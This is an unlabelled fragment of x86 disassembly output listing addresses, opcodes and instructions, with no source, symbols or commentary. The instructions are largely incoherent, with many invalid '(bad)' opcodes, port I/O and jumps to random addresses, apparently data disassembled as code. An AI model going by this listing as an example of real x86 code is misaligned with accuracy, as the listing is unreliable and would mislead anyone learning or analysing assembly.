  431f13:	imul   BYTE PTR [edi+edi*1]
  431f16:	inc    ebp
  431f17:	rcr    BYTE PTR [ecx],1
  431f19:	mov    esi,0x7419f7e5
  431f1e:	or     eax,0x0
	...
  431f37:	add    ah,dh
  431f39:	(bad)  
  431f3a:	gs jmp 0xdc2b23bd
  431f40:	adc    ebx,DWORD PTR [edx]
  431f42:	sti    
  431f43:	sub    edx,ebx
  431f45:	adc    eax,0x83e36254
  431f4a:	in     al,dx
  431f4b:	(bad)
  431f4e:	add    BYTE PTR [edx+0x7c7f2ec4],bl
  431f54:	scas   eax,DWORD PTR es:[edi]
  431f55:	add    al,0x53
  431f57:	(bad)  
  431f58:	fisttp QWORD PTR [ebp+ebx*2+0x2e83a7ee]
  431f5f:	call   0x26ca245b
  431f64:	cld    
  431f65:	mov    ds:0x80e6f138,al
  431f6a:	and    ch,al
  431f6c:	test   DWORD PTR [edx+edx*2],0x14e1dd00
  431f73:	test   BYTE PTR [esi+0x41],cl
  431f76:	sti    
  431f77:	and    BYTE PTR [ebp-0x437af901],0x0
  431f7e:	add    BYTE PTR [eax],al
  431f80:	xchg   edx,eax
  431f81:	jns    0x431f82
  431f83:	mov    eax,gs
  431f85:	in     al,dx
  431f86:	jp     0x431f50
  431f88:	(bad)  
  431f89:	call   0xe1b618bb
  431f8e:	add    eax,0x42
  431f91:	jge    0x431f89
  431f93:	add    BYTE PTR ds:0x81858d01,bl
  431f99:	jecxz  0x431f91
  431f9b:	inc    DWORD PTR [eax]
	...
  431fb5:	std    
  431fb6:	call   0x150879c
  431fbb:	test   al,al
  431fbd:	sub    DWORD PTR [eax-0xa],esp
  431fc0:	jne    0x431f7b
  431fc2:	call   0xe1f6e497
  431fc7:	xor    al,0xf6
  431fca:	in     eax,dx
  431fcb:	jae    0x43201a
  431fcd:	mov    esi,DWORD PTR [ebp-0x7b]
  431fd0:	fsub   QWORD PTR [eax]
  431fd2:	call   0xe0c070cd
  431fd7:	aas    
  431fd8:	dec    edx
  431fd9:	adc    ch,al
  431fdb:	test   al,al
  431fdd:	imul   esi,DWORD PTR [ebx],0xec68ff4a
  431fe3:	mov    WORD PTR [ebp-0x23],es
  431fe6:	pop    eax
  431fe7:	mov    BYTE PTR [ebp-0x43],bl
  431fea:	sbb    DWORD PTR [ebp-0xc],0xe8f34624
  431ff1:	mov    al,ds:0x19fffb54
  431ff6:	leave  
  431ff7:	jae    0x432012
  431ff9:	xchg   edx,eax
  431ffa:	sub    eax,0x8dee4f7
  431fff:	lea    eax,[ebp-0x4dfa60c]
  432005:	or     esi,0xffffff90
  432008:	inc    ebp
  432009:	test   dh,ch
  43200b:	sub    ecx,DWORD PTR [eax+edx*8]
  43200e:	sbb    eax,0x5ab187ff
  432013:	nop
  432014:	inc    ebp
  432015:	fs inc esi
  432017:	jl     0x432072
	...
  432031:	add    ah,dh
  432033:	sbb    eax,0x160ce7b9
  432038:	(bad)  
  432039:	(bad)  
  43203a:	jns    0x43202d
  43203c:	daa    
  43203d:	call   0xfb6196db
  432042:	dec    edi
  432043:	cmp    eax,0x1df503a7
  432048:	dec    DWORD PTR [ecx+esi*2+0x23fb207a]
  43204f:	out    dx,al
  432050:	push   ds
  432051:	jae    0x432043
  432053:	stos   BYTE PTR es:[edi],al
  432054:	neg    DWORD PTR [edi]
  432056:	in     eax,0x5d
  432058:	inc    DWORD PTR [edi-0x37]
  43205b:	pop    ds
  43205c:	add    al,0x0
  43205e:	hlt    
  43205f:	cmp    ch,BYTE PTR [ecx+0x3cab1c1]
  432065:	cmp    BYTE PTR [ecx-0x2d],dl
  432068:	xchg   edx,eax
  432069:	pop    esp
  43206a:	jg     0x4320cc
  43206c:	pop    es
  43206d:	das    
  43206e:	jmp    0x8306:0x61fe169e
  432075:	rcl    dl,0x4d
  432078:	add    bl,0xfc
  43207b:	push   edx
  43207c:	daa    
  43207d:	aad    0xc8
  43207f:	add    bl,BYTE PTR [esi]
  432081:	xchg   esp,eax
  432083:	inc    esi
  432084:	adc    dh,BYTE PTR [ebp-0x7]
  432087:	xchg   ebp,eax
  432088:	mov    edi,0xad569ffa
  43208d:	add    BYTE PTR [edi+0x7c],al
  432090:	nop
  432091:	test   DWORD PTR [eax+0x21e404],edi
	...
  4320af:	(bad)  
  4320b0:	mov    ah,0x35
  4320b2:	mov    ch,0x8e
  4320b4:	stc    
  4320b5:	cmp    ch,dh
  4320b7:	ret    
  4320b8:	add    al,0x66
  4320ba:	sbb    al,0xd4
  4320bc:	add    esp,DWORD PTR [edx-0x39]
  4320bf:	outs   dx,BYTE PTR ds:[esi]
  4320c0:	int3   
  4320c1:	sbb    esp,DWORD PTR [ecx]
  4320c3:	loope  0x4320bf
  4320c5:	adc    eax,0x5bbab2b5
  4320ca:	xchg   DWORD PTR [eax],edi
  4320cc:	adc    DWORD PTR [edx-0x38e35bdf],esp
  4320d2:	or     BYTE PTR [edi+0x13],0x6c
  4320d6:	inc    esp
  4320d7:	out    dx,eax
  4320d8:	jns    0x4320fe
  4320da:	and    DWORD PTR [esi-0xbf6b1e4],esp
  4320e0:	add    al,0x1b
  4320e2:	mov    ?,WORD PTR [ecx+0x2cbd1213]
  4320e8:	inc    esi
  4320e9:	in     eax,0x3
  4320eb:	or     al,0x31
  4320ed:	mov    bh,0x20
  4320ef:	andps  xmm5,xmm0
  4320f2:	inc    ebp
  4320f3:	lock add al,0xb6
  4320f6:	lods   eax,DWORD PTR ds:[esi]
  4320f7:	add    edx,esi
  4320f9:	sub    eax,0x50c5fbae
  4320fe:	sbb    al,BYTE PTR [ebp+0x12]
  432101:	cmp    cl,BYTE PTR [esi+0x826aeab]
  432107:	hlt    
  432108:	sbb    al,0x98
  43210a:	(bad)
  43210d:	daa    
  43210e:	or     ah,dh
  432110:	mov    ch,0xb1
  432112:	stos   DWORD PTR es:[edi],eax
	...
  43212b:	add    bh,cl
  43212d:	xchg   esi,eax
  43212e:	test   al,0x3
  432130:	pop    edx
  432131:	add    eax,0xf8bf3cd7
  432136:	fs hlt 
  432138:	repz add al,0x6e
  43213b:	sbb    al,0x71
  43213d:	adc    al,BYTE PTR [eax]
  43213f:	jge    0x43210c
  432141:	mov    ecx,0xf527bc86
  432146:	aas    
  432147:	jmp    0xd242c999
  43214c:	xor    BYTE PTR [edx+edi*8+0x3ff573fc],0xe9
  432154:	jb     0x43219b
  432156:	je     0x432146
  432158:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432159:	unpckhps xmm1,XMMWORD PTR [ecx+0x1effd267]
  432160:	popf   
  432161:	pmullw mm4,QWORD PTR [edx+0x7]
  432165:	mov    dl,dh
  432167:	sbb    al,0x1c
  432169:	mov    ch,0x52
  43216b:	pop    edx
  43216c:	test   BYTE PTR ds:0xd2477115,0xff
  432173:	cs jnp 0x432125
  432176:	test   DWORD PTR [edx-0x16fbaf90],ebp
  43217c:	aam    0x98
  43217e:	and    ebp,ebp
  432180:	imul   ebp,DWORD PTR [eax+0x1cf00300],0xdd4634f
  43218a:	mov    esi,0x740df7e5
  43218f:	or     eax,0x0
	...
  4321a8:	add    ah,ch
  4321aa:	ret    0xe965
  4321ad:	dec    ecx
  4321ae:	adc    ah,bl
  4321b0:	stos   DWORD PTR es:[edi],eax
  4321b1:	adc    DWORD PTR [esi],ecx
  4321b3:	sti    
  4321b4:	sub    esi,ebx
  4321b6:	add    al,0x55
  4321b8:	bound  edx,QWORD PTR [ebx]
  4321ba:	test   ah,ch
  4321bc:	or     esp,ebp
  4321be:	add    al,0x0
  4321c0:	mov    edi,0xbb5808c
  4321c5:	call   0xe1a61cd7
  4321ca:	sbb    al,0xf9
  4321cc:	push   edi
  4321cd:	adc    eax,0xef00050e
  4321d2:	push   es
  4321d3:	add    BYTE PTR [eax],al
  4321d5:	xchg   DWORD PTR [ecx],ebx
  4321d7:	dec    ebx
  4321d8:	push   0xffffff8d
  4321da:	xor    BYTE PTR [ebp-0x28],0xe
  4321de:	mov    esi,0xd471e8f6
  4321e3:	idiv   bh
  4321e5:	adc    cl,cl
  4321e7:	jne    0x432206
  4321e9:	push   ss
  4321ea:	retf   
  4321eb:	dec    edi
  4321ec:	push   0x3ae915
  4321f1:	call   0xab40f271
  4321f6:	icebp  
  4321f7:	dec    edi
  4321f8:	call   0x3962d0
  4321fd:	ror    al,1
  4321ff:	push   es
  432200:	xchg   ebp,eax
  432201:	popf   
  432202:	jl     0x4321c4
  432204:	jne    0x43224a
  432206:	ss mov ebx,0xd07bd466
  43220c:	std    
	...
  432225:	add    BYTE PTR [edx-0xf],ch
  432228:	mov    eax,0x51cee
  43222d:	lea    edx,[eax-0x55000d1a]
  432233:	retf   0xffff
  432236:	int    0x3f
  432238:	je     0x432233
  43223a:	and    eax,0x1d4082b9
  43223f:	je     0x4321c6
  432241:	shr    BYTE PTR [eax-0x55af090f],1
  432247:	or     edx,DWORD PTR [ebx+0x7b049d11]
  43224d:	jge    0x432234
  43224f:	or     DWORD PTR [esi+0x24],ebp
  432252:	push   esi
  432253:	dec    eax
  432254:	jmp    DWORD PTR [ebp+0x4e]
  432257:	xor    ebx,edi
  432259:	jae    0x432251
  43225b:	pop    eax
  43225c:	not    BYTE PTR ds:0x3b12fd
  432262:	hlt    
  432263:	sbb    bh,BYTE PTR [edi]
  432265:	push   eax
  432266:	mov    ebx,0x798d0377
  43226b:	out    dx,al
  43226c:	and    bl,bh
  43226e:	stos   DWORD PTR es:[edi],eax
  43226f:	outs   dx,BYTE PTR ds:[esi]
  432270:	daa    
  432271:	in     al,0x17
  432273:	push   ds
  432274:	jmp    esi
  432276:	call   0x9213ab2b
  43227b:	daa    
  43227c:	sbb    dl,BYTE PTR [eax-0x64]
  43227f:	push   esp
  432280:	imul   edi,edx,0xc8b9d783
  432286:	mov    dh,0x2a
  432288:	call   DWORD PTR [eax+eax*1+0x0]
	...
  4322a0:	add    BYTE PTR [eax],al
  4322a2:	add    BYTE PTR [edi+0x3a],bh
  4322a5:	jle    0x43228b
  4322a7:	ins    BYTE PTR es:[edi],dx
  4322a8:	in     eax,dx
  4322a9:	mov    ah,0x4e
  4322ab:	retf   0x92a8
  4322ae:	and    ebp,esp
  4322b0:	inc    ebp
  4322b1:	out    dx,eax
  4322b2:	xor    ah,dh
  4322b4:	sbb    eax,0xc35cc286
  4322b9:	aam    0xff
  4322bb:	inc    ebx
  4322bc:	mov    ds:0x85de743e,al
  4322c1:	push   esi
  4322c2:	sbb    dh,ah
  4322c4:	sbb    eax,0xe279014e
  4322c9:	out    0x7,eax
  4322cb:	or     al,0x40
  4322cd:	aam    0xff
  4322cf:	sbb    eax,DWORD PTR [eax]
  4322d1:	xchg   BYTE PTR [edi+0x5d2792af],bh
  4322d7:	ss sub bh,bh
  4322da:	sub    eax,0xe82bc31f
  4322df:	retf   0xff2e
  4322e2:	jmp    DWORD PTR [esp+ebx*1-0x4a0bfbbf]
  4322e9:	jne    0x4322f6
  4322eb:	hlt    
  4322ec:	sbb    eax,0x29b6014f
  4322f1:	jmp    FWORD PTR [esi]
  4322f3:	mov    ah,0x4
  4322f5:	test   eax,0x2705fca5
  4322fa:	pop    es
  4322fb:	hlt    
  4322fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4322fd:	gs or  al,0xba
  432300:	pop    edi
  432301:	call   0x9c481b47
  432306:	mov    al,BYTE PTR [eax]
	...
  432320:	cwde   
  432321:	add    DWORD PTR ds:0x7484451b,0xb
  432328:	cmc    
  432329:	mov    bl,0x92
  43232b:	mov    dh,0x7a
  43232d:	sub    ch,BYTE PTR [esi+0x13]
  432330:	pop    es
  432331:	or     DWORD PTR [edi],edx
  432333:	inc    esp
  432334:	fwait
  432335:	shl    DWORD PTR [ebp-0x62],0xf7
  432339:	add    al,0x54
  43233b:	in     al,0xdb
  43233d:	fs jmp 0x82601746
  432343:	pop    es
  432344:	hlt    
  432345:	add    al,0x6c
  432347:	inc    esp
  432348:	loopne 0x432347
  43234a:	pop    ebp
  43234b:	sbb    al,0x5c
  43234d:	ficomp WORD PTR [edi+0x1d]
  432350:	dec    edi
  432351:	sbb    esp,edi
  432353:	rol    BYTE PTR [ebx+0x71082b7d],1
  432359:	inc    esp
  43235a:	adc    eax,0xec8e7b36
  43235f:	sub    ecx,DWORD PTR [ebx+ecx*2]
  432362:	jp     0x432381
  432364:	js     0x4323aa
  432366:	std    
  432367:	dec    ecx
  432368:	retf   
  432369:	mov    cr3,ebx
  43236c:	nop
  43236d:	cld    
  43236e:	(bad)  
  432370:	push   cs
  432371:	fcomp  DWORD PTR [ebp+0x4108861d]
  432377:	jno    0x4323bb
  432379:	cmovp  eax,ebp
  43237c:	sub    dl,BYTE PTR [eax+0x55de91f0]
  432382:	call   0x432443
	...
  43239b:	add    BYTE PTR [eax],al
  43239d:	cmp    eax,0x1361ffaa
  4323a2:	mov    al,0xbd
  4323a4:	in     eax,0xf7
  4323a6:	mov    bh,0x86
  4323a8:	adc    eax,0xeb082177
  4323ad:	test   DWORD PTR [edi+ecx*2],0x3f85ff62
  4323b4:	in     eax,0x69
  4323b6:	mov    eax,eax
  4323b8:	div    BYTE PTR [ebx+0x78]
  4323bb:	add    cl,ch
  4323bd:	test   DWORD PTR [ebp+0x3dc4e550],0x89011b85
  4323c7:	mov    cl,ch
  4323c9:	test   DWORD PTR [edi+eax*4],0x3085f029
  4323d0:	jmp    0xc6fb:0xa97f06a9
  4323d7:	je     0x432395
  4323d9:	jb     0x432417
  4323db:	je     0x432414
  4323dd:	mov    ?,esi
  4323df:	out    0xa,eax
  4323e1:	repz add al,0x0
  4323e4:	fs mov bh,0x98
  4323e7:	push   ds
  4323e8:	jb     0x432426
  4323ea:	add    al,bl
  4323ec:	jmp    0xe983a9e4
  4323f1:	je     0x432398
  4323f3:	or     ebp,ecx
  4323f5:	je     0x43239c
  4323f7:	psubsw mm6,QWORD PTR [eax+0x6ce107c4]
  4323fe:	(bad)  
	...
  432419:	add    BYTE PTR [edi],dh
  43241b:	repnz add BYTE PTR [eax+0x3f],ah
  43241f:	add    al,BYTE PTR [edi+0x2e0edc59]
  432425:	push   edi
  432426:	jp     0x43243b
  432428:	je     0x4323d5
  43242a:	push   0xffffff88
  43242c:	clc    
  43242d:	dec    esp
  43242e:	adc    BYTE PTR [edx],cl
  432430:	push   eax
  432431:	add    bh,al
  432433:	push   es
  432434:	call   0xf733bce0
  432439:	test   BYTE PTR ds:0x30570b76,cl
  43243f:	xchg   eax,edi
  432441:	std    
  432442:	adc    dh,cl
  432444:	dec    edi
  432445:	mov    esp,ebx
  432447:	fldpi  
  432449:	fnclex 
  43244b:	lock push esi
  43244d:	cmp    DWORD PTR [esi+0x5],0x0
  432451:	call   0x3c6564
  432456:	sbb    dl,al
  432458:	jae    0x432465
  43245a:	jge    0x43244c
  43245c:	adc    al,0x4
  43245e:	scas   al,BYTE PTR es:[edi]
  43245f:	inc    ecx
  432460:	sti    
  432461:	scas   eax,DWORD PTR es:[edi]
  432462:	pushf  
  432463:	fiadd  WORD PTR [ecx]
  432465:	mov    ebx,DWORD PTR [ebx+0x538b005f]
  43246b:	jmp    0x4ae0567f
  432470:	push   edx
  432471:	leave  
  432472:	lahf   
  432473:	add    al,0x0
  432475:	data16 into 
  432477:	dec    DWORD PTR [edi]
  432479:	mov    al,0x4c
  43247b:	mov    DWORD PTR [ebx],0x0
	...
  432495:	add    BYTE PTR [eax],al
  432497:	mov    ebx,0xad040985
  43249c:	pop    es
  43249d:	mov    edx,0x82544d04
  4324a2:	in     al,dx
  4324a3:	int3   
  4324a4:	fsub   QWORD PTR [edi+0x4b011d02]
  4324aa:	push   esi
  4324ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4324ac:	clc    
  4324ad:	add    BYTE PTR [ebp+0x11],0x86
  4324b1:	or     bh,bh
  4324b3:	cli    
  4324b4:	jge    0x43247c
  4324b6:	call   0x39e114
  4324bb:	add    BYTE PTR [eax-0xa],0x81
  4324bf:	xchg   esp,eax
  4324c0:	jmp    0x1c3824bf
  4324c5:	push   es
  4324c6:	or     edx,0x1d
  4324c9:	(bad)  
  4324ca:	push   DWORD PTR [edi+0x39]
  4324cd:	adc    eax,DWORD PTR [eax]
  4324cf:	ja     0x432512
  4324d1:	or     eax,DWORD PTR [eax]
  4324d3:	imul   esi,DWORD PTR [edx],0x17aa86c1
  4324d9:	adc    cl,BYTE PTR [ebx]
  4324db:	jbe    0x432469
  4324dd:	add    eax,DWORD PTR [eax]
  4324df:	hlt    
  4324e0:	cs aas 
  4324e2:	mov    DWORD PTR [ecx],esi
  4324e4:	neg    ah
  4324e6:	inc    esp
  4324e7:	mov    al,0x2b
  4324e9:	sbb    DWORD PTR [esi-0x3d00e20b],0x40e39
  4324f3:	hlt    
  4324f4:	sbb    eax,0x849c458c
  4324f9:	cmp    BYTE PTR [ebp+0x0],0x0
	...
  432511:	add    BYTE PTR [eax],al
  432513:	add    BYTE PTR [esi+ebx*1+0x1d718506],cl
  43251a:	(bad)  
  43251b:	jmp    FWORD PTR [edi-0x27]
  43251e:	sub    eax,DWORD PTR [edi+0x348a31c1]
  432524:	cld    
  432525:	xchg   esi,eax
  432526:	dec    eax
  432527:	call   0xfb597efd
  43252c:	jno    0x43258c
  43252e:	push   es
  43252f:	mov    ch,BYTE PTR [esp+ebx*1+0x567fffff]
  432536:	mov    BYTE PTR [ebp+0x50],dl
  432539:	xchg   edi,eax
  43253a:	inc    eax
  43253b:	call   0xfb59932d
  432540:	jg     0x432598
  432542:	xor    bh,0x2b
  432545:	adc    edi,DWORD PTR [ebx+0x53]
  432548:	cmc    
  432549:	sbb    eax,0x233f84ff
  43254e:	jnp    0x43257b
  432550:	cmc    
  432551:	sbb    eax,0x50b2eff
  432556:	repnz push edx
  432558:	aaa    
  432559:	mov    ds:0x9530ff6d,eax
  43255e:	mov    eax,0x9478f3c3
  432563:	mov    ebx,0x2b420be8
  432568:	inc    edi
  432569:	jg     0x4325a5
  43256b:	sbb    dh,BYTE PTR [ebx+0x42]
  43256e:	pop    esi
  43256f:	nop
  432570:	fistp  QWORD PTR [edi-0x25]
  432573:	mov    bl,0xd3
  432575:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432576:	test   al,0x3
	...
  432590:	add    ah,dh
  432592:	sub    DWORD PTR [ecx],0xe940700a
  432598:	add    esi,esp
  43259a:	ret    
  43259b:	add    BYTE PTR [esi+0x4976f2af],0x8d
  4325a2:	and    eax,0x7ff403e9
  4325a7:	pushf  
  4325a8:	sbb    edi,DWORD PTR [ebp-0x4f]
  4325ab:	cld    
  4325ac:	lea    ecx,[edx-0x31]
  4325af:	mov    ch,0x95
  4325b1:	out    0xfb,eax
  4325b3:	xchg   ecx,eax
  4325b4:	or     al,0xfb
  4325b6:	or     eax,0x87ff8fdf
  4325bb:	rol    BYTE PTR [edi],1
  4325bd:	loopne 0x4325c2
  4325bf:	inc    sp
  4325c1:	(bad)  
  4325c2:	into   
  4325c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4325c4:	xchg   esi,eax
  4325c5:	dec    edi
  4325c6:	jg     0x432579
  4325c8:	in     eax,dx
  4325c9:	dec    ecx
  4325ca:	xor    eax,0x908addaa
  4325cf:	add    BYTE PTR [edi+0x4cde06ac],al
  4325d5:	retf   
  4325d6:	cli    
  4325d7:	or     al,BYTE PTR [ebp+0xc13f9ec]
  4325dd:	xchg   esi,eax
  4325de:	xchg   eax,eax
  4325e0:	or     eax,0x436e06a9
  4325e5:	fwait
  4325e6:	inc    esp
  4325e7:	add    bl,ch
  4325e9:	cmp    BYTE PTR [ecx+0x79fc5cfb],0x4
  4325f0:	jmp    0xd4d02aec
	...
  43260d:	add    bl,ch
  43260f:	jge    0x432656
  432611:	push   ecx
  432612:	and    BYTE PTR [esi],bh
  432614:	(bad)  
  432615:	call   0xbe03a711
  43261a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43261b:	cmp    ebx,0x750fe4b5
  432621:	inc    ebp
  432622:	add    DWORD PTR [esi-0x18],0xfb0e18ed
  432629:	jb     0x4325e6
  43262b:	push   ss
  43262c:	xchg   DWORD PTR [ebx+eiz*8+0x3378047b],esi
  432633:	inc    ebp
  432634:	je     0x43260a
  432636:	js     0x4325f8
  432638:	sti    
  432639:	jb     0x4325f6
  43263b:	push   ss
  43263c:	(bad)  
  43263d:	in     eax,0x76
  43263f:	mov    dh,BYTE PTR [edi]
  432641:	jmp    0xb9ca2dc9
  432646:	(bad)  
  432648:	jmp    0x432630
  43264a:	fmul   QWORD PTR ds:0xa99edd45
  432650:	mul    esi
  432652:	jns    0x4325f0
  432654:	cli    
  432655:	into   
  432656:	or     al,0x8a
  432658:	jl     0x43261f
  43265a:	cld    
  43265b:	std    
  43265c:	test   BYTE PTR [ebp+0x71fb0dfd],ch
  432662:	jl     0x432669
  432664:	add    cl,ch
  432666:	push   ds
  432667:	jge    0x432669
  432669:	jmp    0x9d88a865
  43266e:	jb     0x4325f8
  432670:	repz add DWORD PTR [eax],0x0
	...
  43268b:	cmp    eax,0xd8e9fb0b
  432690:	sbb    ecx,DWORD PTR [ebx]
  432692:	add    dl,ah
  432694:	les    eax,FWORD PTR [edx+0x4b7a5004]
  43269a:	inc    eax
  43269b:	sbb    eax,0x2674bf8b
  4326a0:	jns    0x4326ef
  4326a2:	or     BYTE PTR [esi],bh
  4326a4:	jns    0x432674
  4326a6:	(bad)  
  4326a7:	mov    ebp,0xda75bf89
  4326ac:	js     0x4326f3
  4326ae:	lock push esi
  4326b0:	inc    ebx
  4326b1:	pop    es
  4326b2:	(bad)  
  4326b3:	nop
  4326b4:	in     eax,dx
  4326b5:	mov    al,BYTE PTR [eax]
  4326b7:	int    0x5
  4326b9:	mov    DWORD PTR [ecx],eax
  4326bb:	ret    
  4326bc:	xor    bh,0x16
  4326bf:	cmp    ah,0x82
  4326c2:	inc    ebp
  4326c3:	fnstsw WORD PTR [eax+0x4d]
  4326c6:	or     al,0x12
  4326c8:	dec    ebx
  4326c9:	repz xchg esp,eax
  4326cb:	popf   
  4326cc:	add    eax,0x789c8900
  4326d1:	jge    0x4326bf
  4326d3:	es shl edi,0x4
  4326d7:	mov    es,WORD PTR ds:0xdd608300
  4326dd:	add    edi,edi
  4326df:	push   eax
  4326e0:	cmc    
  4326e1:	add    BYTE PTR [ebp-0x63],0x38
  4326e5:	xor    al,BYTE PTR [ebp-0x67]
  4326e8:	add    DWORD PTR [edx+0x71],edi
  4326eb:	dec    ebx
  4326ec:	icebp  
  4326ed:	imul   bl
	...
  432707:	add    BYTE PTR [edx-0x36],dl
  43270a:	inc    esp
  43270b:	clc    
  43270c:	jmp    0xf743:0xe6000000
  432713:	mov    ecx,DWORD PTR [eax]
  432715:	cmc    
  432716:	out    0xdc,eax
  432718:	pop    edi
  432719:	add    eax,0x43c66600
  43271e:	repz jmp 0x432771
  432721:	lods   eax,DWORD PTR ds:[esi]
  432722:	nop
  432723:	add    ah,dh
  432725:	sbb    edi,edi
  432727:	pop    edx
  432728:	retf   0x4cd6
  43272b:	mov    esi,0x86b01bec
  432730:	or     BYTE PTR [esi-0x1658b7d9],bl
  432736:	stos   BYTE PTR es:[edi],al
  432737:	xchg   cl,al
  432739:	out    0xe9,eax
  43273b:	aas    
  43273c:	hlt    
  43273d:	out    dx,al
  43273e:	inc    ebx
  43273f:	ret    0xcfb1
  432742:	add    ecx,DWORD PTR [ebp-0x5899368f]
  432748:	lahf   
  432749:	sbb    DWORD PTR [edx+0x122e4ea6],0x75
  432750:	in     al,dx
  432751:	jae    0x4326dc
  432753:	inc    ebp
  432754:	test   al,0x6e
  432756:	adc    dl,dl
  432758:	ja     0x43279b
  43275a:	and    eax,DWORD PTR [eax]
  43275c:	ja     0x432738
  43275e:	pop    es
  43275f:	lea    esi,[ecx]
  432761:	cli    
  432762:	mov    bl,0xe7
  432764:	add    eax,0x70fb152c
  432769:	ficom  WORD PTR [eax+0xd]
	...
  432783:	add    BYTE PTR [eax],al
  432785:	jno    0x432710
  432787:	and    ch,al
  432789:	mov    eax,ds:0x4cfb154d
  43278e:	lods   al,BYTE PTR ds:[esi]
  43278f:	add    eax,DWORD PTR [eax]
  432791:	hlt    
  432792:	add    al,0x71
  432794:	add    esp,esi
  432796:	sbb    eax,0xcea04588
  43279b:	sub    eax,DWORD PTR [edi]
  43279d:	sub    al,0x30
  43279f:	adc    al,BYTE PTR [esp+esi*1-0x1673124e]
  4327a6:	xor    DWORD PTR [edi],esp
  4327a8:	shl    BYTE PTR ds:0x64b81248,cl
  4327ae:	push   ds
  4327af:	(bad)  
  4327b0:	call   FWORD PTR [ebp-0x30]
  4327b3:	add    al,0x0
  4327b5:	hlt    
  4327b6:	add    al,0x66
  4327b8:	mov    al,ds:0xc06c054b
  4327bd:	and    esi,DWORD PTR [ebp+0x6e54680]
  4327c3:	mov    bh,BYTE PTR [edi+0x34]
  4327c6:	xchg   edx,eax
  4327c7:	xrelease mov BYTE PTR [ecx-0x3aad6eec],ah
  4327ce:	push   es
  4327cf:	jb     0x4327fd
  4327d1:	iret   
  4327d2:	add    eax,0xf09a03e9
  4327d7:	jae    0x432799
  4327d9:	daa    
  4327da:	mov    ch,0x6b
  4327dc:	shl    BYTE PTR [ebx+0x6b2d51b4],0x41
  4327e3:	(bad)  [ebx]
  4327e5:	loop   0x4327aa
  4327e7:	call   0x4327ef
	...
  432800:	add    BYTE PTR [eax],al
  432802:	ins    DWORD PTR es:[edi],dx
  432803:	sar    DWORD PTR [eax+ecx*4+0x39],0x11
  432808:	cdq    
  432809:	stos   DWORD PTR es:[edi],eax
  43280a:	data16 add al,0xe9
  43280d:	add    ecx,esp
  43280f:	push   cs
  432810:	(bad)  
  432811:	adc    eax,0x8c197bbf
  432816:	sub    DWORD PTR ds:0x80ff0d6c,ebx
  43281c:	and    al,BYTE PTR [ebx]
  43281e:	hlt    
  43281f:	add    al,0x6e
  432821:	mov    eax,0xd2e09aa7
  432826:	sar    DWORD PTR [ebx+0x26],0xbc
  43282a:	xchg   BYTE PTR ds:0x81ef3164,dl
  432830:	xchg   esi,eax
  432831:	add    al,0xf4
  432833:	add    al,0xe6
  432835:	xor    eax,0x88ddb17c
  43283a:	outs   dx,BYTE PTR ds:[esi]
  43283b:	retf   
  43283c:	aad    0x5
  43283e:	jecxz  0x4327c5
  432840:	jmp    0x23bd1c48
  432845:	cld    
  432846:	jl     0x432809
  432848:	push   DWORD PTR [eax-0x16f97690]
  43284e:	jb     0x432839
  432850:	gs std 
  432852:	jb     0x432815
  432854:	sar    DWORD PTR [ecx],cl
  432856:	jnp    0x43281b
  432858:	add    edi,DWORD PTR [ecx]
  43285a:	add    edx,esi
  43285c:	push   edi
  43285d:	div    DWORD PTR [edi]
  43285f:	pop    es
  432860:	jle    0x43280f
  432862:	in     al,dx
  432863:	add    eax,0xf4
	...
  43287d:	add    BYTE PTR [eax],al
  43287f:	cld    
  432880:	jg     0x4328c7
  432882:	xor    eax,0x24c2037f
  432887:	in     eax,dx
  432888:	add    eax,0x36cabe7
  43288d:	aaa    
  43288e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43288f:	dec    ebx
  432890:	xchg   edx,eax
  432891:	or     al,0x62
  432893:	mov    bl,0x4a
  432895:	daa    
  432896:	and    DWORD PTR [edi+0xc],esi
  432899:	add    BYTE PTR [ebx],0xef
  43289c:	add    al,0x72
  43289e:	imul   ebp,DWORD PTR [ecx+0x7fc3baf7]
  4328a5:	mov    edi,0x660e8302
  4328aa:	add    DWORD PTR [edi+0x6d],edi
  4328ad:	repz and BYTE PTR [ebp+0x46],bl
  4328b1:	sbb    BYTE PTR [ecx-0x49087000],bh
  4328b7:	or     al,dh
  4328b9:	dec    ebx
  4328ba:	fbstp  TBYTE PTR [edi-0x3da81fa]
  4328c0:	sahf   
  4328c1:	pop    ss
  4328c2:	xchg   ecx,eax
  4328c3:	sahf   
  4328c4:	shl    ebx,0xc2
  4328c7:	mov    edi,0x3b10f7dd
  4328cc:	push   cs
  4328cd:	jg     0x4328f3
  4328cf:	adc    ch,ch
  4328d1:	jle    0x432881
  4328d3:	outs   dx,DWORD PTR ds:[esi]
  4328d4:	iret   
  4328d5:	neg    BYTE PTR [ebx+0x6d]
  4328d8:	test   DWORD PTR [ebp+0x0],edi
  4328db:	data16 add dh,BYTE PTR [ebp+0x47]
  4328df:	loopne 0x432927
  4328e1:	mov    bh,0x50
	...
  4328fb:	add    BYTE PTR [edi+0x108d5208],dh
  432901:	cmc    
  432902:	mov    WORD PTR [ebp+0x65],es
  432905:	fcmovb st,st(6)
  432907:	add    DWORD PTR ds:0x8c08502,ebx
  43290d:	pop    ds
  43290e:	div    BYTE PTR [ebp+0x75]
  432911:	fisubr DWORD PTR [ecx+eax*1]
  432914:	or     eax,0x93fae902
  432919:	lock not BYTE PTR [esi+0x75]
  43291d:	and    al,0x0
  43291f:	add    BYTE PTR ds:0x3d58135c,cl
  432925:	jnp    0x43296c
  432927:	hlt    
  432928:	pusha  
  432929:	inc    edi
  43292a:	mov    bh,0x50
  43292c:	xor    eax,0xcd000182
  432931:	jl     0x432923
  432933:	test   DWORD PTR [ebx],ebx
  432935:	ja     0x43293a
  432937:	jmp    0x3a1950
  43293c:	push   esi
  43293d:	ja     0x432922
  43293f:	mov    ebx,DWORD PTR [eax+0x3a684df5]
  432945:	add    al,BYTE PTR [eax]
  432947:	add    BYTE PTR ds:0x2fe30b8,al
  43294d:	pop    eax
  43294e:	test   eax,ebx
  432950:	cmc    
  432951:	(bad)  
  432953:	dec    DWORD PTR [ebp-0x1a0f8a82]
  432959:	je     0x432986
  43295b:	inc    BYTE PTR [edx+0x75d286]
	...
  432979:	mov    ds:0xa5ec757e,al
